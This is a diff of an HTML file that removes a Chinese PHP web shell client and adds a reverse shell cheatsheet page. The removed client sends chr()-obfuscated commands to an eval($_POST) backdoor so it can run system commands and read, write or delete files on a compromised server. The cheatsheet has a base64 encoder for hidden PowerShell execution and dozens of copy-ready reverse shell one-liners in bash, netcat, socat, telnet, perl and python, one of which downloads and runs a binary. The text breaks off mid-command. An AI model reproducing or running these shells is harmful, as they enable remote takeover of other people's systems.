@@ -1,295 +1,410 @@
-
-<HTML><HEAD>
-<!-- codz by Lanker(QQ:18779569)、孟兄(QQ:80607005) 2004/12/22-->
-<META content="text/html; charset=gb2312" http-equiv=Content-Type>
-<META content="MSHTML 5.00.2614.3500" name=GENERATOR>
-<style>
-<!--
- td		{font-size:8pt; color: #666666;font-family:Verdana}
- INPUT		{font-size:9pt;BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; BORDER-LEFT: #cccccc 1px solid; COLOR: #666666; BORDER-BOTTOM: #cccccc 1px solid; BACKGROUND-COLOR: #ffffff}
- textarea	{font-size:9pt;BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; BORDER-LEFT: #cccccc 1px solid; COLOR: #666666; BORDER-BOTTOM: #cccccc 1px solid; BACKGROUND-COLOR: #ffffff}  
- select		{font-size:9pt;BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; BORDER-LEFT: #cccccc 1px solid; COLOR: #666666; BORDER-BOTTOM: #cccccc 1px solid; BACKGROUND-COLOR: #ffffff}  
- BODY		{font-size:9pt; color: #666666;font-family:Verdana; SCROLLBAR-FACE-COLOR: #ffffff; background color:#eeeeee;cursor:SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; SCROLLBAR-SHADOW-COLOR: #aaaaaa; SCROLLBAR-3DLIGHT-COLOR: #aaaaaa; SCROLLBAR-ARROW-COLOR: #dddddd; SCROLLBAR-TRACK-COLOR: #ffffff; SCROLLBAR-DARKSHADOW-COLOR: #ffffff }
- a:link		{text-decoration:none; color:#336699} 
- a:visited	{text-decoration:none; color:#336699} 
- a:active	{text-decoration:none; color:#336699} 
- a:hover	{COLOR: #b4c8d8; }
- .tb		{BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; BORDER-LEFT: #cccccc 1px solid; BORDER-BOTTOM: #cccccc 1px solid;background-color:#cccccc}
- .tb0		{BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; BORDER-LEFT: #cccccc 1px solid; BORDER-BOTTOM: #cccccc 1px solid;background-color:#fcfcfc}
- .tb1		{background-color:#ffffff} </style>
-
-</STYLE>
-</HEAD>
-<BODY style="FONT-SIZE: 9pt" bgcolor="#cccccc">
-<CENTER style="cursor:hand;">
-<font color="#000080">
-lanker微型<FONT color=#ff3300>PHP</font>后门客户端2.0正式版</font>
-</CENTER>
-<hr size="1" color="#000080">
-<FORM ENCTYPE="multipart/form-data" name=frm method=post target=qq2>
-<TABLE style="FONT-SIZE: 9pt">
-  
-    <TD width=800 height=10>木马地址: <INPUT                                                          
-style="BORDER-RIGHT: 1px solid; BORDER-TOP: 1px solid; FONT-SIZE: 9pt; BORDER-LEFT: 1px solid; BORDER-BOTTOM: 1px solid" 
-size=85 value='', name=act> 密码: <INPUT                                                          
-style="BORDER-RIGHT: 1px solid; BORDER-TOP: 1px solid; FONT-SIZE: 9pt; BORDER-LEFT: 1px solid; BORDER-BOTTOM: 1px solid" 
-size=20 value=1 name=para><input type=hidden name='tmpcmd'></TD></TABLE>
-<TABLE width=750 >
-<TD bgcolor=#ffffff><TABLE style="FONT-SIZE: 9pt" ><tr width=200 height=10>
-<select onchange="showDiv(this.value);">
-<option value="digest" >----基本功能列表----</option>
-<option value="1" >PHP环境变量</option>
-<option value="2" >本程序目录</option>
-<option value="3" >执行CMD命令</option>
-<option value="6" >读取目录</option>
-<option value="14" >创建目录</option>
-<option value="15" >删除目录</option>
-<option value="4" >上传文件</option>
-<option value="5" >读取文件</option>
-<option value="12" >创建文件</option>
-<option value="7" >复制文件</option>
-<option value="8" >重命名文件</option>
-<option value="9" >删除文件</option>
-<option value="13" >下载文件</option>
-<option value="11" >执行SQL语句</option>
-<option value="10" >专家模式（自己写代码）</option>
-</select></tr><tr height=260><TD id="yunxing" >LANKER微型PHP后门服务端代码：<br>&lt;?php eval($_POST[cmd])?><hr size="1" color="#000080"><br>容错代码为：<br>&lt;?php @eval($_POST[cmd])?><TD></tr></TABLE></td><td><TABLE style="FONT-SIZE: 9pt"><IFRAME border=1 height=340 width=580 name=qq2 marginwidth=0 marginheight=0 vspace=0
-	  src="about:blank" 
-      frameborder=no scrolling=auto name=ifff value="fdsadfas"></IFRAME></TABLE></td></table>
-
-</form>
-
-<hr size="1" color="#000080">
-<CENTER>
-<center><font class=font>PHP soft Web Shell v2.0<br>
--------------Code By <FONT color=#ff3300>lanker</font>、<FONT color=#ff3300>孟兄</font> ----------- <br><FONT color=#ff3300>声明:请勿使用本程序从事非法行为，否则后果自负！</font></center>
-</BODY></HTML>
-
-
-<script language="javascript">
-function showDiv(aa){
-
-switch(aa) 
-{ 
-
-case "1":
-yunxing.innerHTML="PHP环境变量<br>"
-yunxing.innerHTML+="<p align='center'><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;frm.tmpcmd.value=\"phpinfo();\";frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>" 
-break;
-case "2":
-yunxing.innerHTML="<p align='center'>本程序目录<br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;frm.tmpcmd.value=\"echo dirname(__FILE__);\";frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>"
-break;
-case "3": 
-yunxing.innerHTML="<p align='center'><INPUT   size=24 name=\"aaaa\"><br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;cmd();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>"
-break;
-case "4": 
-yunxing.innerHTML="<p align='center'><input NAME='LanKerF' TYPE='file' size=13><br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;frm.tmpcmd.value=\"if (copy($_FILES[LanKerF][tmp_name],$_FILES[LanKerF][name])) echo OK;\";frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>"
-break;
-case "5": 
-yunxing.innerHTML="<p align='center'>文件名:<br><INPUT   size=24 name=\"duqu\"><br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;readfile();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send> <br><br><br><br><br><br><br><br><br><br>"
-break;
-case "6": 
-yunxing.innerHTML="<p align='center'>目录名:<br><INPUT   size=24 name=\"duqu\"><br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;readdir();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>"
-break;
-case "7": 
-yunxing.innerHTML="<p align='center'>文件1:<br><INPUT  size=24 name=\"file1\"><br>文件2:<br><INPUT   size=24 name=\"file2\"><br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;copyfile();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>"
-break;
-case "8": 
-yunxing.innerHTML="<p align='center'>文件1:<br><INPUT   size=24 name=\"file1\"><br>文件2:<br><INPUT size=24 name=\"file2\"><br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;renamefile();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>"
-break;
-case "9": 
-yunxing.innerHTML="<p align='center'>文件名:<br><INPUT   size=24 name=\"filen\"><br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;delfile();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>"
-break;
-case "10":
-yunxing.innerHTML="<p align='center'><textarea  rows='17' name='duqu' cols='22'>phpinfo();</textarea>"
-yunxing.innerHTML+="<br><INPUT  onclick='Javascipt:frm.tmpcmd.name=frm.para.value;frm.tmpcmd.value=frm.duqu.value;frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send>"
-break;
-case "11":
-yunxing.innerHTML="主机：<input NAME=\"servername\" TYPE=\"text\" value=\"localhost\" size=\"12\"   ><BR>数据库：<input NAME=\"dbname\" TYPE=\"text\" value size=\"10\"   > &nbsp;<BR>用户名：<input NAME=\"dbusername\" TYPE=\"text\" value=\"root\" size=\"10\"   >&nbsp; <BR>密码：<input NAME=\"dbpassword\" TYPE=\"text\" value size=\"12\"   > &nbsp; <BR>SQL语句:<BR><textarea rows=\"8\" name=\"sql\" cols=\"20\"   ></textarea>"
-yunxing.innerHTML+="<br><INPUT    onclick='Javascipt:frm.tmpcmd.name=frm.para.value;SQL();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send>"
-break;
-
-
-case "12": 
-yunxing.innerHTML="<p align='center'>文件名:<INPUT   size=14 name=\"filen\"><br>文件内容:<BR><textarea rows=\"16\" name=\"filec\" cols=\"20\"   >注意：不支持中文字符！</textarea><br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;createfile();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>"
-break;
-case "13": 
-yunxing.innerHTML="<p align='center'>文件名:<br><INPUT   size=24 name=\"filen\"><br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;downfile();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>"
-break;
-case "14": 
-yunxing.innerHTML="<p align='center'>目录名:<br><INPUT   size=24 name=\"dir\"><br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;createdir();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>"
-break;
-case "15": 
-yunxing.innerHTML="<p align='center'>目录名:<br><INPUT   size=24 name=\"dir\"><br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;rmdir();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>"
-break;
-} 
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Reverse shell cheatsheet</title>
+<!--<script>
+function disableScrolling(){
+    var x=window.scrollX;
+    var y=window.scrollY;
+    window.onscroll=function(){window.scrollTo(x, y);};
 }
 
-function cmd(){
-frm.tmpcmd.value="$cmd="
-frm.tmpcmd.value+=duqu(frm.aaaa.value)
-frm.tmpcmd.value+=";\n"
-frm.tmpcmd.value+="echo chr(60).chr(112).chr(114).chr(101).chr(62);\n"
-frm.tmpcmd.value+="@system($cmd);\n"
-frm.tmpcmd.value+="echo chr(60).chr(47).chr(112).chr(114).chr(101).chr(62);\n"
+function enableScrolling(){
+    window.onscroll=function(){};
 }
 
-
-function readfile(){
-frm.tmpcmd.value="$filename="
-frm.tmpcmd.value+=duqu(frm.duqu.value)
-frm.tmpcmd.value+=";\n"
-frm.tmpcmd.value+="$s=chr(60).chr(112).chr(114).chr(101).chr(62);\n"
-frm.tmpcmd.value+="$e=chr(60).chr(47).chr(112).chr(114).chr(101).chr(62);\n"
-frm.tmpcmd.value+="$fp=@fopen($filename,r);\n"
-frm.tmpcmd.value+="$contents=@fread($fp, filesize($filename));\n"
-frm.tmpcmd.value+="@fclose($fp);\n"
-frm.tmpcmd.value+="$contents=htmlspecialchars($contents);\n"
-frm.tmpcmd.value+="echo $s.$contents.$e;\n"
+function copy(item_id) {
+  disableScrolling();
+  var copyText = document.getElementById(item_id).textContent;
+  const textArea = document.getElementById('txt');
+  textArea.textContent = copyText;
+  textArea.select();
+  document.execCommand("copy");
+  enableScrolling();
+  return false;
 }
-function readdir(){
-frm.tmpcmd.value="$dir="
-frm.tmpcmd.value+=duqu(frm.duqu.value)
-frm.tmpcmd.value+=";\n"
-frm.tmpcmd.value+="$f = chr(60).chr(98).chr(114).chr(62);"
-frm.tmpcmd.value+="$dir=@dir($dir);"
-frm.tmpcmd.value+="if($dir) "
-frm.tmpcmd.value+="{"
-frm.tmpcmd.value+="  echo path_______.$dir->path.$f;"
-frm.tmpcmd.value+="  while($entry=$dir->read())"
-frm.tmpcmd.value+="	{"
-frm.tmpcmd.value+=" echo ____.$entry.$f; "
-frm.tmpcmd.value+="  }"
-frm.tmpcmd.value+="  $dir->close();"
-frm.tmpcmd.value+="}"
-frm.tmpcmd.value+="else"
-frm.tmpcmd.value+="{echo 0;}"
-}
+</script>-->
 
-function SQL(){
-frm.tmpcmd.value="$message=chr(102).chr(97).chr(105).chr(108).chr(33);\n"
-frm.tmpcmd.value+="$fgf=chr(32);\n"
-frm.tmpcmd.value+="$servername="
-frm.tmpcmd.value+=duqu(frm.servername.value)
-frm.tmpcmd.value+=";\n"
-frm.tmpcmd.value+="$dbusername="
-frm.tmpcmd.value+=duqu(frm.dbusername.value)
-frm.tmpcmd.value+=";\n"
-frm.tmpcmd.value+="$dbpassword="
-frm.tmpcmd.value+=duqu(frm.dbpassword.value)
-frm.tmpcmd.value+=";\n"
-frm.tmpcmd.value+="$dbname="
-frm.tmpcmd.value+=duqu(frm.dbname.value)
-frm.tmpcmd.value+=";\n"
-frm.tmpcmd.value+="$sql="
-frm.tmpcmd.value+=duqu(frm.sql.value)
-frm.tmpcmd.value+=";\n"
-frm.tmpcmd.value+="@mysql_connect($servername,$dbusername,$dbpassword) or die($message);\n"
-frm.tmpcmd.value+="@mysql_select_db($dbname) or die($message);\n"
-frm.tmpcmd.value+="$result = @mysql_query($sql);\n"
-frm.tmpcmd.value+="if($result){\n"
-frm.tmpcmd.value+="echo SQL语句成功执行;}\n"
-frm.tmpcmd.value+="else{echo 失败.mysql_error();}\n"
-frm.tmpcmd.value+="mysql_close();"
-}
+<script>
+	function copy(item_id) {
+	disableScrolling();
+	var copyText = document.getElementById(item_id);
+	const textArea = document.getElementById('output');
+	textArea.value = copyText.textContent;
+	textArea.select();
+	document.execCommand("copy");
+	enableScrolling();
+	// alert("Text copied to clipboard: " + textArea.value);
+	}
 
-function createfile(){
+	function disableScrolling() {
+	document.body.style.overflow = 'hidden';
+	}
 
-frm.tmpcmd.value="$filen="
-frm.tmpcmd.value+=duqu(frm.filen.value)
-frm.tmpcmd.value+=";\n"
-frm.tmpcmd.value+="$filec="
-frm.tmpcmd.value+=duqu(frm.filec.value)
-frm.tmpcmd.value+=";\n"
-frm.tmpcmd.value+="$a=chr(119);\n"
-frm.tmpcmd.value+="$fp=@fopen($filen,$a);\n"
-frm.tmpcmd.value+="$msg=@fwrite($fp,$filec);\n"
-frm.tmpcmd.value+="if($msg) echo chr(79).chr(75).chr(33);\n"
-frm.tmpcmd.value+="@fclose($fp);\n"
-}
-
-
-function copyfile(){
-frm.tmpcmd.value="$file1="
-frm.tmpcmd.value+=duqu(frm.file1.value)
-frm.tmpcmd.value+=";\n"
-frm.tmpcmd.value+="$file2="
-frm.tmpcmd.value+=duqu(frm.file2.value)
-frm.tmpcmd.value+=";\n"
-frm.tmpcmd.value+="if (@copy($file1,$file2)) echo chr(79).chr(75).chr(33);\n"
-}
-
-
-
-
-function renamefile(){
-
-frm.tmpcmd.value="$file1="
-frm.tmpcmd.value+=duqu(frm.file1.value)
-frm.tmpcmd.value+=";\n"
-frm.tmpcmd.value+="$file2="
-frm.tmpcmd.value+=duqu(frm.file2.value)
-frm.tmpcmd.value+=";\n"
-frm.tmpcmd.value+="if (@rename($file1,$file2)) echo chr(79).chr(75).chr(33);\n"
-}
-
-
-
-function downfile(){
-frm.tmpcmd.value="$df="
-frm.tmpcmd.value+=duqu(frm.filen.value)
-frm.tmpcmd.value+=";\n"
-frm.tmpcmd.value+="$f=chr(46);"
-frm.tmpcmd.value+="$h=chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(116).chr(121).chr(112).chr(101).chr(58).chr(32).chr(97).chr(112).chr(112).chr(108).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(47).chr(120).chr(45);\n"
-frm.tmpcmd.value+="$h1=chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(68).chr(105).chr(115).chr(112).chr(111).chr(115).chr(105).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(97).chr(116).chr(116).chr(97).chr(99).chr(104).chr(109).chr(101).chr(110).chr(116).chr(59).chr(32).chr(102).chr(105).chr(108).chr(101).chr(110).chr(97).chr(109).chr(101).chr(61);\n"
-frm.tmpcmd.value+="$h2=(68).chr(101).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(80).chr(72).chr(80).chr(51).chr(32).chr(71).chr(101).chr(110).chr(101).chr(114).chr(97).chr(116).chr(101).chr(100).chr(32).chr(68).chr(97).chr(116).chr(97);\n"
-frm.tmpcmd.value+="$fn = basename($df);\n"
-frm.tmpcmd.value+="$fe = $finfo[count($finfo)-1];\n"
-frm.tmpcmd.value+="$finfo = explode($f, $fn);\n"
-frm.tmpcmd.value+="header($h.$fe);\n"
-frm.tmpcmd.value+="header($h1.$fn);\n"
-frm.tmpcmd.value+="header($h2);\n"
-frm.tmpcmd.value+="@readfile($df);\n"
-frm.tmpcmd.value+="header($h2);\n"
-frm.tmpcmd.value+="exit;\n"
-}
-
-
-function delfile(){
-frm.tmpcmd.value="$filen="
-frm.tmpcmd.value+=duqu(frm.filen.value)
-frm.tmpcmd.value+=";\n"
-frm.tmpcmd.value+="if(@unlink($filen)) echo chr(79).chr(75).chr(33);"
-}
-
-
-function createdir(){
-frm.tmpcmd.value="$dirs="
-frm.tmpcmd.value+=duqu(frm.dir.value)
-frm.tmpcmd.value+=";\n"
-frm.tmpcmd.value+="if(@mkdir($dirs,0777)) echo chr(79).chr(75).chr(33);"
-}
-
-function rmdir(){
-frm.tmpcmd.value="$dirs="
-frm.tmpcmd.value+=duqu(frm.dir.value)
-frm.tmpcmd.value+=";\n"
-frm.tmpcmd.value+="if(@rmdir($dirs)) echo chr(79).chr(75).chr(33);"
-}
-function returnc(){
-alret("document.frm.ifff.value")
-}
-
-
-
+	function enableScrolling() {
+	document.body.style.overflow = 'auto';
+	}
 </script>
-<script >
-function duqu(zifu){ 
-var duqu="";
-for(i=1;i<zifu.length;i++){
-duqu+="chr("+zifu.charCodeAt(i-1)+").";
+
+
+
+<style type="text/css">
+body{
+font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;
+background-color: #ccc;
 }
-duqu+="chr("+zifu.charCodeAt(zifu.length-1)+")";
-return duqu
+button{
+
+  padding:0 5px;
+  margin:0;
 }
+pre{
+  font-family: SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;
+  font-size:12px;
+  background-color: #f6f8fa;
+  overflow: auto;
+    border: 1px solid #898989;
+    padding: 5px;
+}
+.main{
+  max-width:800px;
+  margin:auto;
+  background-color: #fff;
+  padding:15px;
+  border: 1px solid #898989;
+}
+input[type=text]{
+  border: 1px solid #898989;
+  font-size:22px;
+width:200px;
+}
+</style>
+</head>
+<body>
+<div class="main">
+
+    <h3>Command Base64 encoding</h3>
+<p>Input type:
+<input type="radio" id="bash" name="option" value="bash" onclick="processInput();" checked=""><label for="bash">Bash</label>
+<input type="radio" id="powershell" name="option" value="powershell" onclick="processInput();"><label for="powershell">PowerShell</label>
+<input type="radio" id="python" name="option" value="python" onclick="processInput();"><label for="python">Python</label>
+<input type="radio" id="perl" name="option" value="perl" onclick="processInput();"><label for="perl">Perl</label></p>
+<p><textarea rows="10" style="width: 100%; box-sizing: border-box;" id="input" placeholder="Type PowerShell here..."></textarea>
+<textarea rows="5" style="width: 100%; box-sizing: border-box;" id="output" onclick="this.focus(); this.select();" readonly=""></textarea></p>
+
+<script>
+  var taInput = document.querySelector('textarea#input');
+  var taOutput = document.querySelector('textarea#output');
+
+  function processInput() {
+    var option = document.querySelector('input[name="option"]:checked').value;
+
+    switch (option) {
+      case 'bash':
+        taInput.placeholder = 'Type Bash here...'
+        taOutput.value = 'bash -c {echo,' + btoa(taInput.value) + '}|{base64,-d}|{bash,-i}';
+        break;
+      case 'powershell':
+        taInput.placeholder = 'Type PowerShell here...'
+        poshInput = ''
+        for (var i = 0; i < taInput.value.length; i++) { poshInput += taInput.value[i] + unescape("%00"); }
+        taOutput.value = 'powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc ' + btoa(poshInput);
+        break;
+      case 'python':
+        taInput.placeholder = 'Type Python here...'
+        taOutput.value = "python -c exec('" + btoa(taInput.value) + "'.decode('base64'))";
+        break;
+      case 'perl':
+        taInput.placeholder = 'Type Perl here...'
+        taOutput.value = "perl -MMIME::Base64 -e eval(decode_base64('" + btoa(taInput.value) + "'))";
+        break;
+      default:
+        taOutput.value = ''
+    }
+
+    if (!taInput.value) taOutput.value = '';
+  }
+
+  taInput.addEventListener('input', processInput, false);
 </script>
+</div>
+
+
+<div class="main">
+IP: <input type="text" id="ip" value="127.0.0.1" name="ip">
+Port: <input type="text" id="port" value="8080" name="port">
+<input type="submit" value="Change" onclick="myFunction()">
+<input type="reset" value="Reset" onclick="myFunction2()">
+<script>
+    function myFunction(){
+      var ip = document.getElementById("ip").value;
+      var port = document.getElementById("port").value;
+      var html= document.body.innerHTML;
+      html=html.replace(/127\.0\.0\.1/g,ip);           
+      html=html.replace(/8080/g,port);
+      document.body.innerHTML=html;
+      taInput = document.querySelector('textarea#input');
+      taOutput = document.querySelector('textarea#output');
+      taInput.addEventListener('input', processInput, false);
+    }
+    function myFunction2(){
+      location.reload();
+    }
+</script>
+
+
+<h3>Bash TCP:</h3>
+Victim:
+<pre id="cmd001">bash -i >& /dev/tcp/127.0.0.1/8080 0>&1</pre>
+<button onclick="copy('cmd001')">Copy</button>
+<pre id="cmd002">/bin/bash -i > /dev/tcp/127.0.0.1/8080 0<& 2>&1</pre>
+<button onclick="copy('cmd002');">Copy</button>
+<pre id="cmd003">exec 5<>/dev/tcp/127.0.0.1/8080;cat <&5 | while read line; do $line 2>&5 >&5; done</pre>
+<button onclick="copy('cmd003');">Copy</button>
+<pre id="cmd004">exec /bin/sh 0&lt;/dev/tcp/127.0.0.1/8080 1>&0 2>&0</pre>
+<button onclick="copy('cmd004');">Copy</button>
+<pre id="cmd005">0<&196;exec 196<>/dev/tcp/127.0.0.1/8080; sh <&196 >&196 2>&196</pre>
+<button onclick="copy('cmd005');">Copy</button>
+
+<h3>Bash UDP:</h3>
+Victim:
+<pre id="cmd006">sh -i >& /dev/udp/127.0.0.1/8080 0>&1</pre>
+<button onclick="copy('cmd006');">Copy</button><br>
+Listener:
+<pre id="cmd007">nc -u -lvp 8080</pre>
+<button onclick="copy('cmd007');">Copy</button>
+
+<h3>Netcat:</h3>
+<pre id="nc01">nc -e /bin/sh 127.0.0.1 8080</pre>
+<button onclick="copy('nc01');">Copy</button>
+<pre id="nc02">nc -e /bin/bash 127.0.0.1 8080</pre>
+<button onclick="copy('nc02');">Copy</button>
+<pre id="nc03">nc -c bash 127.0.0.1 8080</pre>
+<button onclick="copy('nc03');">Copy</button>
+<pre id="nc04">mknod backpipe p && nc 127.0.0.1 8080 0&lt;backpipe | /bin/bash 1>backpipe </pre>
+<button onclick="copy('nc04');">Copy</button>
+<pre id="nc05">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 8080 >/tmp/f</pre>
+<button onclick="copy('nc05');">Copy</button>
+<pre id="nc06">rm -f /tmp/p; mknod /tmp/p p && nc 127.0.0.1 8080 0/tmp/p 2>&1</pre>
+<button onclick="copy('nc06');">Copy</button>
+<pre id="nc07">rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc 127.0.0.1 8080 > f</pre>
+<button onclick="copy('nc07');">Copy</button>
+<pre id="nc08">rm -f x; mknod x p && nc 127.0.0.1 8080 0&lt;x | /bin/bash 1>x</pre>
+<button onclick="copy('nc08');">Copy</button>
+
+<h3>Ncat:</h3>
+<pre id="ncat01">ncat 127.0.0.1 8080 -e /bin/bash</pre>
+<button onclick="copy('ncat01');">Copy</button>
+<pre id="ncat02">ncat --udp 127.0.0.1 8080 -e /bin/bash</pre>
+<button onclick="copy('ncat02');">Copy</button>
+
+<h3>Telnet:</h3>
+<pre id="telnet01">rm -f /tmp/p; mknod /tmp/p p && telnet 127.0.0.1 8080 0/tmp/p 2>&1</pre>
+<button onclick="copy('telnet01');">Copy</button>
+<pre id="telnet02">telnet 127.0.0.1 8080 | /bin/bash | telnet 127.0.0.1 444</pre>
+<button onclick="copy('telnet02');">Copy</button>
+<pre id="telnet03">rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet 127.0.0.1 8080 > f</pre>
+<button onclick="copy('telnet03');">Copy</button>
+<pre id="telnet04">rm -f x; mknod x p && telnet 127.0.0.1 8080 0&lt;x | /bin/bash 1>x</pre>
+<button onclick="copy('telnet04');">Copy</button>
+
+<h3>Socat:</h3>
+Victim:
+<pre id="socat01">/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:127.0.0.1:8080</pre>
+<button onclick="copy('socat01');">Copy</button>
+<pre id="socat02">socat tcp-connect:127.0.0.1:8080 exec:"bash -li",pty,stderr,setsid,sigint,sane</pre>
+<button onclick="copy('socat02');">Copy</button><br>
+Listener:
+<pre id="socat03">socat file:`tty`,raw,echo=0 TCP-L:8080</pre>
+<button onclick="copy('socat03');">Copy</button>
+<br>
+Victim:
+<pre id="socat04">wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:127.0.0.1:8080</pre>
+<button onclick="copy('socat04');">Copy</button>
+
+<h3>Perl:</h3>
+Victim:
+<pre id="perl01">perl -e 'use Socket;$i="127.0.0.1";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'</pre>
+<button onclick="copy('perl01');">Copy</button>
+
+<pre id="perl02">perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"127.0.0.1:8080");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'</pre>
+<button onclick="copy('perl02');">Copy</button><br>
+
+Windows only, Victim:
+<pre id="perl03">perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"127.0.0.1:8080");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'</pre>
+<button onclick="copy('perl03');">Copy</button>
+
+<h3>Python:</h3>
+IP v4
+<pre id="python01">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</pre>
+<button onclick="copy('python01');">Copy</button>
+
+<pre id="python02">export RHOST="127.0.0.1";export RPORT=8080;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'</pre>
+<button onclick="copy('python02');">Copy</button>
+
+<pre id="python03">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</pre>
+<button onclick="copy('python03');">Copy</button>
+
+IP v6
+<pre id="python04">python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",8080,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'</pre>
+<button onclick="copy('python04');">Copy</button>
+
+Windows only:
+<pre id="python05">C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('127.0.0.1', 8080)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, 